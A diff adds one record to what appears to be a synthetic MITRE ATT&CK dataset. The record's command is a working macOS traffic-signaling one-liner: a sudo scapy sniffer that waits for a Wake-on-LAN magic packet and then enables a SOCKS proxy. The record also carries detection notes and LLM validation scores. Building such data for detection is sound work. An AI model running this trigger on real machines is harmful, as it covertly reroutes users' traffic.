@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'import os; from scapy.all import sniff,Raw; sniff(filter=\"udp and port 9\", prn=lambda p: os.system(\"networksetup -setsocksfirewallproxy \\\"Wi-Fi\\\" 127.0.0.1 1080 && networksetup -setsocksfirewallproxystate \\\"Wi-Fi\\\" on\") if Raw in p and bytes(p[Raw].load).startswith(b\"\\xff\"*6) else None, count=1)'",
+  "explanation": "Sniffs for a WOL-format magic packet on UDP/9 and, upon detecting the 6xFF preamble, enables a local SOCKS proxy. Requires sudo due to raw packet capture. Detection: watch for unauthorized packet capture processes and proxy enablement following broadcast WOL traffic.",
+  "rationale_steps": [
+    "Use scapy to sniff raw packets for UDP/9 traffic and validate the magic preamble b\"\\xff\"*6.",
+    "On the first match, flip SOCKS proxy on for Wi-Fi via networksetup.",
+    "Requires elevated privileges (sudo) to access promiscuous/raw capture.",
+    "Detect by monitoring use of packet capture tools and correlating with sudden proxy state changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-a48797ce",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Quoting and parentheses are balanced, the Python one-liner is valid, scapy arguments are well-formed, and inner quotes are correctly escaped for the shell.",
+        "semantic_score": 4,
+        "semantic_justification": "It aligns with Traffic Signaling by triggering on a WOL-style UDP/9 payload to enable a SOCKS proxy, but count=1 makes sniff stop after the first UDP/9 packet even if it\u2019s not a magic packet, reducing reliability.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T16:42:41.371005Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, correct Python syntax, valid Scapy arguments, and proper escaping for the nested shell command within os.system().",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of detecting a specific network signal (WOL-like magic packet) and triggering a system action (enabling a SOCKS proxy on macOS), which is a clear and operationally plausible implementation of Traffic Signaling (T1205).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T16:42:56.492702Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
